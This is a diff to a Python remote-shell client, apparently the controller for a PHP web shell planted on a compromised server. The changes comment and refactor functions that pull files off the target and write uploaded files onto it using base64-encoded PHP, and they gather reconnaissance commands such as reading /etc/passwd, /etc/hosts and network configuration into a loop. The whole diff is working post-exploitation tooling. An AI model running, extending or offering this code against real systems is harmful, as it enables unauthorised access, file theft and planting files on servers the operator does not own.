@@ -104,10 +104,12 @@ class rshell(Cmd):
 
     def do_download(self, line):
         files = line.split()
+        #Return file contents encoded in base 64
         cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
         (code, data) = self.dorequest(cmd)
         if code == 200:
             f = file(os.path.basename(files[0]), "w")
+            #Decode data and write it in a file
             f.write(base64.decodestring(data))
             f.close()
         else:
@@ -118,10 +120,13 @@ class rshell(Cmd):
         (filename, destination) = line.split()
         f = file(filename)
         fname = os.path.basename(filename)
+        #Encode file data in base 64
         data = base64.encodestring(f.read()).replace("\n", "")
         f.close()
-        cmd = "file_put_contents('{0}/{1}',base64_decode('{2}'));".format(destination,fname, data)
-        (code, data) = self.dorequest(cmd)
+        #Building the command in remote server to decode base 64
+        # and write the data in the file
+        cmd = "file_put_contents('{0}/{1}',base64_decode('{2}'));"
+        (code, data) = self.dorequest(cmd.format(destination, fname, data))
         if code == 200:
             print data
         else:
@@ -144,51 +149,21 @@ class rshell(Cmd):
 
     def do_getsysinfo(self, line):
         #Print user and system information
-        print "=" * 80
-        print "User name:"
-        print "-" * 80
-        cmd = "whoami"
-        self.default(cmd)
-        print "=" * 80
-        print "User id:"
-        print "-" * 80
-        cmd = "id"
-        self.default(cmd)
-        print "=" * 80
-        print "/etc/passwd:"
-        print "-" * 80
-        cmd = "cat /etc/passwd"
-        self.default(cmd)
-        print "=" * 80
-        print "/etc/issue:"
-        print "-" * 80
-        cmd = "cat /etc/issue"
-        self.default(cmd)
-        print "=" * 80
-        print "Host name:"
-        print "-" * 80
-        cmd = "hostname -f"
-        self.default(cmd)
-        print "=" * 80
-        print "System information (uname):"
-        print "-" * 80
-        cmd = "uname -a"
-        self.default(cmd)
-        print "=" * 80
-        print "Network iterfaces:"
-        print "-" * 80
-        cmd = "ifconfig -a"
-        self.default(cmd)
-        print "=" * 80
-        print "/etc/resolv.conf:"
-        print "-" * 80
-        cmd = "cat /etc/resolv.conf"
-        self.default(cmd)
-        print "=" * 80
-        print "Hosts ips information:"
-        print "-" * 80
-        cmd = "cat /etc/hosts"
-        self.default(cmd)
+        cmds = {"User name:": "whoami",
+                "User id:": "id",
+                "/etc/passwd:": "cat /etc/passwd",
+                "/etc/issue:": "cat /etc/issue",
+                "Host name:": "hostname -f",
+                "System information (uname):": "uname -a",
+                "Network iterfaces:": "ifconfig -a",
+                "/etc/resolv.conf:": "cat /etc/resolv.conf",
+                "Hosts ips information /etc/hosts:": "cat /etc/hosts",
+                }
+        for k, val in cmds.items():
+            print "=" * 80
+            print k
+            print "-" * 80
+            self.default(val)
         return None
 
     def do_getswversion(self, line):
@@ -229,3 +204,7 @@ class rshell(Cmd):
             self.file_exists(filename[:-1])
         filelist.close()
         return None
+
+#    def do_cd(self, line):
+#        cmd = "cd ../; pwd"
+#        self.default(cmd)
